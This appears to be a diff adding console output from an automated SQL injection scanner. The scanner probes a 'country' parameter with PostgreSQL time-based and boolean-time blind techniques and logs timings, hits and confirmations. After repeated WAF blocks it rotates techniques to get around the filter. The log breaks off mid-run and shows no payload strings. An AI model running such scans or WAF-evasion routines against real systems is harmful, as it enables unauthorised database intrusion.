+[*] testing 'PostgreSQL inline subquery' (param='country' req#179)
+    [IN-inline] [PostgreSQL] req#159 err=False status=429  no error
+[*] testing 'PostgreSQL inline subquery' (param='country' req#180)
+    [IN-inline] [PostgreSQL] req#160 err=False status=429  no error
+[*] [diag] _try_technique: tech=IN dbms=PostgreSQL templates=2876 → testing 575 payloads
+[*] testing 'PostgreSQL inline subquery' (param='country' req#181)
+[*] [TECHNIQUE-22] PostgreSQL: 43 consecutive WAF blocks — rotating to next DBMS 
+[*] ├─ [2/10] PostgreSQL › Timebased  │ tech=BT   │ 572 base payloads (2876 expanded)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#182)
+    [BT-timing] [PostgreSQL] req#162 elapsed=315ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#183)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#184)
+    [BT-timing] [PostgreSQL] req#164 elapsed=325ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#185)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#186)
+    [BT-timing] [PostgreSQL] req#166 elapsed=371ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#187)
+    [BT-timing] [PostgreSQL] req#167 elapsed=336ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#188)
+    [BT-timing] [PostgreSQL] req#168 elapsed=340ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#189)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#190)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#191)
+    [BT-timing] [PostgreSQL] req#171 elapsed=328ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#192)
+    [BT-timing] [PostgreSQL] req#172 elapsed=320ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#193)
+    [BT-timing] [PostgreSQL] req#173 elapsed=327ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#194)
+    [BT-timing] [PostgreSQL] req#174 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#195)
+    [BT-timing] [PostgreSQL] req#175 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#196)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#197)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#198)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#199)
+    [BT-timing] [PostgreSQL] req#179 elapsed=298ms threshold=1700ms baseline=200ms  miss
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#200)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#201)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#202)
+    [BT-timing] [PostgreSQL] req#182 elapsed=341ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#203)
+    [BT-timing] [PostgreSQL] req#183 elapsed=327ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#204)
+    [BT-timing] [PostgreSQL] req#184 elapsed=1324ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#205)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#206)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#207)
+    [BT-timing] [PostgreSQL] req#187 elapsed=368ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#208)
+    [BT-timing] [PostgreSQL] req#188 elapsed=313ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#209)
+    [BT-timing] [PostgreSQL] req#189 elapsed=332ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#210)
+    [BT-timing] [PostgreSQL] req#190 elapsed=331ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#211)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#212)
+    [BT-timing] [PostgreSQL] req#192 elapsed=1355ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#213)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#214)
+    [BT-timing] [PostgreSQL] req#194 elapsed=1327ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#215)
+    [BT-timing] [PostgreSQL] req#195 elapsed=349ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#216)
+    [BT-timing] [PostgreSQL] req#196 elapsed=351ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#217)
+    [BT-timing] [PostgreSQL] req#197 elapsed=325ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#218)
+    [BT-timing] [PostgreSQL] req#198 elapsed=315ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#219)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#220)
+    [BT-timing] [PostgreSQL] req#200 elapsed=589ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#221)
+    [BT-timing] [PostgreSQL] req#201 elapsed=357ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#222)
+    [BT-timing] [PostgreSQL] req#202 elapsed=347ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#223)
+    [BT-timing] [PostgreSQL] req#203 elapsed=349ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#224)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#225)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#226)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#227)
+    [BT-timing] [PostgreSQL] req#207 elapsed=661ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#228)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#229)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#230)
+    [BT-timing] [PostgreSQL] req#210 elapsed=1352ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#231)
+    [BT-timing] [PostgreSQL] req#211 elapsed=592ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#232)
+    [BT-timing] [PostgreSQL] req#212 elapsed=332ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#233)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#234)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#235)
+    [BT-timing] [PostgreSQL] req#215 elapsed=335ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#236)
+    [BT-timing] [PostgreSQL] req#216 elapsed=352ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#237)
+    [BT-timing] [PostgreSQL] req#217 elapsed=1347ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#238)
+    [BT-timing] [PostgreSQL] req#218 elapsed=1334ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#239)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#240)
+    [BT-timing] [PostgreSQL] req#220 elapsed=345ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#241)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#242)
+    [BT-timing] [PostgreSQL] req#222 elapsed=339ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#243)
+    [BT-timing] [PostgreSQL] req#223 elapsed=348ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#244)
+    [BT-timing] [PostgreSQL] req#224 elapsed=3348ms threshold=1700ms baseline=200ms  HIT
+    [BT-clean] false=0ms  fast
+    [BT-multi] probe 3/3: 340ms  fast
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#245)
+    [BT-timing] [PostgreSQL] req#227 elapsed=339ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#246)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#247)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#248)
+    [BT-timing] [PostgreSQL] req#230 elapsed=362ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#249)
+    [BT-timing] [PostgreSQL] req#231 elapsed=348ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#250)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#251)
+    [BT-timing] [PostgreSQL] req#233 elapsed=331ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#252)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#253)
+    [BT-timing] [PostgreSQL] req#235 elapsed=381ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#254)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#255)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#256)
+    [BT-timing] [PostgreSQL] req#238 elapsed=353ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#257)
+    [BT-timing] [PostgreSQL] req#239 elapsed=347ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#258)
+    [BT-timing] [PostgreSQL] req#240 elapsed=1361ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#259)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#260)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#261)
+    [BT-timing] [PostgreSQL] req#243 elapsed=328ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#262)
+    [BT-timing] [PostgreSQL] req#244 elapsed=361ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#263)
+    [BT-timing] [PostgreSQL] req#245 elapsed=322ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#264)
+    [BT-timing] [PostgreSQL] req#246 elapsed=335ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#265)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#266)
+    [BT-timing] [PostgreSQL] req#248 elapsed=346ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#267)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#268)
+    [BT-timing] [PostgreSQL] req#250 elapsed=344ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#269)
+    [BT-timing] [PostgreSQL] req#251 elapsed=307ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#270)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#271)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#272)
+    [BT-timing] [PostgreSQL] req#254 elapsed=386ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#273)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#274)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#275)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#276)
+    [BT-timing] [PostgreSQL] req#258 elapsed=345ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#277)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#278)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#279)
+    [BT-timing] [PostgreSQL] req#261 elapsed=341ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#280)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#281)
+    [BT-timing] [PostgreSQL] req#263 elapsed=356ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#282)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#283)
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#284)
+    [BT-timing] [PostgreSQL] req#266 elapsed=362ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#285)
+    [BT-timing] [PostgreSQL] req#267 elapsed=343ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#286)
+    [BT-timing] [PostgreSQL] req#268 elapsed=328ms threshold=1700ms baseline=200ms  elevated
+[*] [diag] _try_technique: tech=BT dbms=PostgreSQL templates=2876 → testing 575 payloads
+[*] testing 'PostgreSQL boolean-time combined' (param='country' req#287)
+[*] [TECHNIQUE-22] PostgreSQL: 62 consecutive WAF blocks — rotating to next DBMS (TECHNIQUE-27 adaptive)
+[*] ├─ [2/10] PostgreSQL › Timebased  │ tech=T    │ 572 base payloads (2876 expanded)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#288)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#289)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#290)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#291)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#292)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#293)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#294)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#295)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#296)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#297)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#298)
+    [T-timing] [PostgreSQL] req#298 elapsed=1342ms threshold=1700ms baseline=200ms  elevated
+    [T-diff] req#280 1342ms > 600ms differential threshold  injected
+    [T-confirm] fp2=318ms diff_thresh=600ms pass=False
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#299)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#300)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#301)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#302)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#303)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#304)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#305)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#306)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#307)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#308)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#309)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#310)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#311)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#312)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#313)
+    [T-timing] [PostgreSQL] req#313 elapsed=358ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#314)
+    [T-timing] [PostgreSQL] req#314 elapsed=349ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#315)
+    [T-timing] [PostgreSQL] req#315 elapsed=355ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#316)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#317)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#318)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#319)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#320)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#321)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#322)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#323)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#324)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#325)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#326)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#327)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#328)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#329)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#330)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#331)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#332)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#333)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#334)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#335)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#336)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#337)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#338)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#339)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#340)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#341)
+    [T-timing] [PostgreSQL] req#341 elapsed=344ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#342)
+    [T-timing] [PostgreSQL] req#342 elapsed=381ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#343)
+    [T-timing] [PostgreSQL] req#343 elapsed=341ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#344)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#345)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#346)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#347)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#348)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#349)
+    [T-timing] [PostgreSQL] req#349 elapsed=338ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#350)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#351)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#352)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#353)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#354)
+    [T-timing] [PostgreSQL] req#354 elapsed=339ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#355)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#356)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#357)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#358)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#359)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#360)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#361)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#362)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#363)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#364)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#365)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#366)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#367)
+    [T-timing] [PostgreSQL] req#367 elapsed=341ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#368)
+    [T-timing] [PostgreSQL] req#368 elapsed=1332ms threshold=440ms baseline=200ms  HIT
+    [T-confirm] fp2=351ms diff_thresh=600ms pass=False
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#369)
+    [T-timing] [PostgreSQL] req#369 elapsed=334ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#370)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#371)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#372)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#373)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#374)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#375)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#376)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#377)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#378)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#379)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#380)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#381)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#382)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#383)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#384)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#385)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#386)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#387)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#388)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#389)
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#390)
+    [T-timing] [PostgreSQL] req#390 elapsed=1340ms threshold=1700ms baseline=200ms  elevated
+    [T-diff] req#374 1340ms > 600ms differential threshold  injected
+    [T-confirm] fp2=335ms diff_thresh=600ms pass=False
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#391)
+    [T-timing] [PostgreSQL] req#391 elapsed=301ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#392)
+    [T-timing] [PostgreSQL] req#392 elapsed=344ms threshold=1700ms baseline=200ms  elevated
+[*] [diag] _try_technique: tech=T dbms=PostgreSQL templates=2876 → testing 575 payloads
+[*] testing 'PostgreSQL AND time-based blind' (param='country' req#393)
+[*] [TECHNIQUE-22] PostgreSQL: 15 consecutive WAF blocks — rotating to next DBMS (TECHNIQUE-27 adaptive)
+[*] ├─ [2/10] PostgreSQL › Timebased  │ tech=TH   │ 572 base payloads (2876 expanded)
+[*] testing 'PostgreSQL header time-based' (param='country' req#394)
+    [T-timing] [PostgreSQL] req#394 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#395)
+    [T-timing] [PostgreSQL] req#395 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#396)
+    [T-timing] [PostgreSQL] req#396 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#397)
+    [T-timing] [PostgreSQL] req#397 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#398)
+    [T-timing] [PostgreSQL] req#398 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#399)
+    [T-timing] [PostgreSQL] req#399 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#400)
+    [T-timing] [PostgreSQL] req#400 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#401)
+    [T-timing] [PostgreSQL] req#401 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#402)
+    [T-timing] [PostgreSQL] req#402 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#403)
+    [T-timing] [PostgreSQL] req#403 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#404)
+    [T-timing] [PostgreSQL] req#404 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#405)
+    [T-timing] [PostgreSQL] req#405 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#406)
+    [T-timing] [PostgreSQL] req#406 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#407)
+    [T-timing] [PostgreSQL] req#407 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#408)
+    [T-timing] [PostgreSQL] req#408 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#409)
+    [T-timing] [PostgreSQL] req#409 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#410)
+    [T-timing] [PostgreSQL] req#410 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#411)
+    [T-timing] [PostgreSQL] req#411 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#412)
+    [T-timing] [PostgreSQL] req#412 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#413)
+    [T-timing] [PostgreSQL] req#413 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#414)
+    [T-timing] [PostgreSQL] req#414 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#415)
+    [T-timing] [PostgreSQL] req#415 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#416)
+    [T-timing] [PostgreSQL] req#416 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#417)
+    [T-timing] [PostgreSQL] req#417 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#418)
+    [T-timing] [PostgreSQL] req#418 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#419)
+    [T-timing] [PostgreSQL] req#419 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#420)
+    [T-timing] [PostgreSQL] req#420 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#421)
+    [T-timing] [PostgreSQL] req#421 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#422)
+    [T-timing] [PostgreSQL] req#422 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#423)
+    [T-timing] [PostgreSQL] req#423 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#424)
+    [T-timing] [PostgreSQL] req#424 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#425)
+    [T-timing] [PostgreSQL] req#425 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#426)
+    [T-timing] [PostgreSQL] req#426 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#427)
+    [T-timing] [PostgreSQL] req#427 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#428)
+    [T-timing] [PostgreSQL] req#428 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#429)
+    [T-timing] [PostgreSQL] req#429 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#430)
+    [T-timing] [PostgreSQL] req#430 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#431)
+    [T-timing] [PostgreSQL] req#431 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#432)
+    [T-timing] [PostgreSQL] req#432 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#433)
+    [T-timing] [PostgreSQL] req#433 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#434)
+    [T-timing] [PostgreSQL] req#434 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#435)
+    [T-timing] [PostgreSQL] req#435 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#436)
